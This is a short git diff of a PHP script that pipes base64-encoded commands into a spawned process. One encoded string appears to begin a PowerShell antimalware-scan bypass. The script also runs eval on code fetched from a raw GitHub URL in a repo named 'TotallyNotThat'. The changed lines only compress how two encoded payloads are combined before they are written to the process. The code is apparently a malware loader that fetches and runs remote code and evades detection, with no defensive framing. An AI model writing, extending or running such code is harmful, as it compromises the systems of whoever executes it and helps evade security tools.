@@ -25,12 +25,9 @@ fwrite($pipes[0], base64_decode("JGs9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1
 sleep(5);
 
 eval(file_get_contents("https://raw.githubusercontent.com/TotallyNotThat/testRep/main/file3"));
-$main = getData($b64_a1);
-$inside = base64_encode(getData($b64_a2));
-$finished = str_replace("___VALAMI___", $inside, $main);
 
 
-fwrite($pipes[0], trim($finished));
+fwrite($pipes[0], trim(str_replace("___VALAMI___", base64_encode(getData($b64_a2)), getData($b64_a1))));
 
 
 fwrite($pipes[0], "\n\n\n\n\n");
